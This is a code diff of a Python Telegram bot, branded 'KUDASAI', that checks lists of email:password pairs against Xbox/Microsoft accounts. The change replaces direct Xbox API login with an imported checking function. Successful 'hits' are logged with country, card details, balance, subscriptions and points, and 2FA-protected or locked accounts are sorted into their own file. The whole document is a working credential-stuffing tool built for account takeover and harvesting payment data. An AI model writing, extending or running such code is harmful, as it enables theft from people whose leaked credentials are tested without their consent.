@@ -7,10 +7,10 @@ import time
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
 from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
-from xbox.webapi.api.client import XboxLiveClient
-from xbox.webapi.authentication.manager import AuthenticationManager
-import httpx
 from colorama import init, Fore
+
+# Import your native checking function directly from xbox_checker.py
+from xbox_checker import check_xbox_account
 
 init(autoreset=True)
 
@@ -71,7 +71,7 @@ bot_stats = {
 }
 
 print(Fore.RED + "==================================================")
-print(Fore.RED + " [KUDASAI] STABLE XBOX API CHECKER ONLINE")
+print(Fore.RED + " [KUDASAI] NATIVE ENGINE CHECKER BOT ONLINE")
 print(Fore.RED + "==================================================\n")
 
 def log_to_file(filename, content):
@@ -91,7 +91,7 @@ def generate_progress_bar(current, total, length=10):
     percentage = int(round((current / float(total)) * 100)) if total > 0 else 0
     return f"[{bar}] {percentage}% ({current}/{total})"
 
-async def process_accounts_with_xbox_api(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
+async def process_accounts_with_native_engine(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
     for file in ["results.txt", "2fa.txt", "errors.txt"]:
         fp = os.path.join(OUTPUT_DIR, file)
         if os.path.exists(fp):
@@ -119,86 +119,59 @@ async def process_accounts_with_xbox_api(account_lines, chat_id, context: Contex
         text=f"🚀 **[KUDASAI] XBOX CHECKER INITIALIZED**\n\n"
              f"📊 Progress: `[░░░░░░░░░░] 0% (0/{total})`\n"
              f"🎯 Hits Found: 0\n"
-             f"⏳ Current: Initializing API client..."
+             f"⏳ Current: Starting check..."
     )
 
     start_time = time.time()
     hits = 0
     processed = 0
 
-    async with httpx.AsyncClient(timeout=20.0) as client_http:
-        for email, password in valid_accounts:
-            processed += 1
-            bot_stats["total_processed"] += 1
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    for email, password in valid_accounts:
+        processed += 1
+        bot_stats["total_processed"] += 1
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-            progress_str = generate_progress_bar(processed, total)
-            try:
-                await status_msg.edit_text(
-                    text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
-                         f"📊 Progress: `{progress_str}`\n"
-                         f"🎯 Hits Found: {hits}\n"
-                         f"📧 Checking: `{email}`",
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
+        progress_str = generate_progress_bar(processed, total)
+        try:
+            await status_msg.edit_text(
+                text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
+                     f"📊 Progress: `{progress_str}`\n"
+                     f"🎯 Hits Found: {hits}\n"
+                     f"📧 Checking: `{email}`",
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
 
-            try:
-                auth_mgr = AuthenticationManager(client_http, client_id="", client_secret="", redirect_uri="")
-                await auth_mgr.authenticate(email, password)
-                
-                if not auth_mgr.authenticated:
-                    bot_stats["failed"] += 1
-                    log_to_file("errors.txt", f"[{timestamp}] REJECTED: {email}:{password}")
-                    continue
+        # Execute your checking function asynchronously or via thread executor to avoid blocking the bot loop
+        try:
+            result = await asyncio.to_thread(check_xbox_account, email, password)
+            status = result.get('status')
 
-                xbl_client = XboxLiveClient(
-                    userhash=auth_mgr.userinfo.userhash,
-                    auth_token=auth_mgr.xsts_token.jwt,
-                    xuid=auth_mgr.userinfo.xuid
-                )
-                
-                profile_resp = await xbl_client.profile.get_profile_by_xuid(auth_mgr.userinfo.xuid)
-                gamertag = "Unknown"
-                if profile_resp and 'profileUsers' in profile_resp:
-                    for user in profile_resp['profileUsers']:
-                        for setting in user.get('settings', []):
-                            if setting['id'] == 'GameDisplayName':
-                                gamertag = setting['value']
-
+            if status == 'success':
                 hits += 1
                 bot_stats["successful"] += 1
-
                 result_block = f"--- [{timestamp}] SUCCESS ---\n"
-                result_block += f"Email: {email}\n"
-                result_block += f"Password: {password}\n"
-                result_block += f"Gamertag: {gamertag}\n"
-                result_block += f"XUID: {auth_mgr.userinfo.xuid}\n"
-
-                try:
-                    titles_resp = await xbl_client.titlehub.get_title_history(auth_mgr.userinfo.xuid)
-                    result_block += "Owned / Recent Games:\n"
-                    if titles_resp and 'titles' in titles_resp:
-                        for title in titles_resp['titles'][:15]:
-                            result_block += f"  - {title.get('name', 'Unknown Title')} ({title.get('type', 'Unknown')})\n"
-                    else:
-                        result_block += "  - No public game history found.\n"
-                except Exception:
-                    pass
-
+                result_block += f"Email: {result.get('email')}\n"
+                result_block += f"Country: {result.get('country')}\n"
+                result_block += f"Card: {result.get('card_details')}\n"
+                result_block += f"Balance: {result.get('balance')}\n"
+                result_block += f"Subscription: {result.get('purchased_items')}\n"
+                result_block += f"Points: {result.get('points')}\n"
                 result_block += "=" * 40 + "\n"
                 log_to_file("results.txt", result_block)
-
-            except Exception as e:
+            elif status == '2fa' or status == 'locked':
                 bot_stats["failed"] += 1
-                error_message = str(e).lower()
-                if any(k in error_message for k in ["mfa", "2fa", "twofactor", "proof", "challenge", "captcha"]):
-                    log_to_file("2fa.txt", f"[{timestamp}] 2FA_REQUIRED: {email}:{password}")
-                else:
-                    log_to_file("errors.txt", f"[{timestamp}] ERROR: {email}:{password}")
+                log_to_file("2fa.txt", f"[{timestamp}] 2FA/LOCKED ({result.get('message')}): {email}:{password}")
+            else:
+                bot_stats["failed"] += 1
+                log_to_file("errors.txt", f"[{timestamp}] BAD ({result.get('message')}): {email}:{password}")
 
-            await asyncio.sleep(0.5)
+        except Exception as e:
+            bot_stats["failed"] += 1
+            log_to_file("errors.txt", f"[{timestamp}] EXCEPTION: {email}:{password} | {str(e)}")
+
+        await asyncio.sleep(0.2)
 
     elapsed = round(time.time() - start_time, 2)
     
